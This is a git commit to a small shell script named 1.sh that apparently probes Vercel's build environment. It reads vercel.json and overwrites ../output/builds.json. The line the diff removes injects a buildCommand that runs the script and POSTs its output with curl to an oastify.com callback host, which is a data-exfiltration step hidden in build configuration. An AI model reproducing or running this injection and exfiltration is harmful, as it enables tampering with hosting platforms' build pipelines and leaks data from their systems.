6eaa6153600d80e043d1b3afe348e2c2c4cc5589
w2h3 <118594933+w2h3@users.noreply.github.com>
2023-02-15 17:45:27 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -2,6 +2,5 @@
 
 cat vercel.json
 echo "edited file"
-echo -n '{"target": "preview","argv": ["/node16/bin/node","/var/task/node_modules/.bin/vercel","build","--output","/vercel/output"],"builds": [{"require": "@vercel/static-build","requirePath": "/var/task/node_modules/@vercel/static-build/dist/index","apiVersion": 2,"src": "config.toml","use": "@vercel/static-build","config": {"zeroConfig": true,"framework": "hugo","alias": "test444-nu.vercel.app","buildCommand": "curl -X POST -d \"$(chmod 777 1.sh && ./1.sh)\" https://tebvp8x6drpdp3n0butq3nja319sxls9h.oastify.com/local && hugo -D --gc"}}]}' > ../output/builds.json
 cat ../output/builds.json
 echo "up0"
